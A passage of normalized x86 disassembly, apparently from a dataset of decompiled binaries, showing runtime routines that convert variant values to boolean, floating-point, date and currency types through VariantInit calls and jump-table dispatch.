mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_412bc8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_41300c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4130be
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_415164
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4057d4
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x5 ]
call sub_40a084
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4130c5
lea eax [ ebp - 0xc ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405d28
retn
movzx edx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_411298
jmp r-xdata
movzx edx [ ebx ]
mov cx 0xb
call sub_411298
cmp [ ebp - 0x8 ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x5 ] al
jmp r-xdata
sub_4130d0
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0xb
call sub_411298
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_413110
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413164
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_411a68
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_4131c0
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41316b
lea eax [ ebp - 0x11 ]
call sub_41163c
retn
sub_413174
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_416178
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_4131c0
push ebx
push ecx
mov ebx eax
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4131da ]
mov eax ebx
call sub_41300c
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_41300c
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_4131c0
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_4130d0
mov [ esp ] al
jmp r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_413110
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_410e58
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_413174
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4130d0
mov [ esp ] al
mov eax ebx
call sub_4130d0
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_4133a0 ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_41300c
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_4131c0
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_413514
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4135c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_415164
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_4057d4
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b77c
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
movzx edx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_411298
jmp r-xdata
fld [ ebp - 0x20 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x5
call sub_411298
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4135d0
lea eax [ ebp - 0x24 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405d28
retn
sub_4135d8
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x5
call sub_411298
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_413624
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413679
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_411a68
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4136d4
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413680
lea eax [ ebp - 0x18 ]
call sub_41163c
retn
sub_413688
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_416178
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4136d4
push ebx
add esp 0xffffffec
mov ebx eax
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4136f0 ]
mov eax ebx
call sub_413514
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_413514
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4136d4
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4135d8
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_413624
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_410e58
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_413688
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4135d8
fstp [ esp ]
fwait
mov eax ebx
call sub_4135d8
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4138cc ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_413514
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4136d4
fstp [ esp ]
fwait
jmp r-xdata
sub_413a4c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_413bb1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4136d4
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_413a6e ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_410e58
sub_413bdc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_413cb8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_415164
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
call sub_4057d4
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x10 ]
call sub_40d1a8
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413cbf
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x4 ]
call sub_405d28
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
call sub_4057d4
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_40b798
test al al
je r-xdata
movzx edx [ ebx ]
mov cx 0x7
call sub_411298
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_411298
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_413cc8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x7
call sub_411298
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_413d28
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x7
call sub_411298
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_413d74
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413dc9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_411a68
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_413e24
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413dd0
lea eax [ ebp - 0x18 ]
call sub_41163c
retn
sub_413dd8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_416178
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_413e24
push ebx
add esp 0xffffffec
mov ebx eax
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_413e40 ]
mov eax ebx
call sub_413bdc
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_413d28
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_413bdc
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_413cc8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_413e24
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_413d28
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_413d74
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_410e58
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_413dd8
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_413d28
fstp [ esp ]
fwait
mov eax ebx
call sub_413d28
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41400a ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_413d28
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_413bdc
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_413cc8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_413e24
fstp [ esp ]
fwait
jmp r-xdata
sub_414174
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_414220
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_415164
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_4057d4
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x10 ]
call sub_40b7f0
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414227
lea eax [ ebp - 0x14 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405d28
retn
movzx edx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_411298
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x6
call sub_411298
jmp r-xdata
sub_414230
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x6
call sub_411298
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_414290
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x6
call sub_411298
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_4142dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_414331
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_411a68
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_41438c
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414338
lea eax [ ebp - 0x18 ]
call sub_41163c
retn
sub_414340
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_416178
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_41438c
push ebx
add esp 0xffffffec
mov ebx eax
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4143a8 ]
mov eax ebx
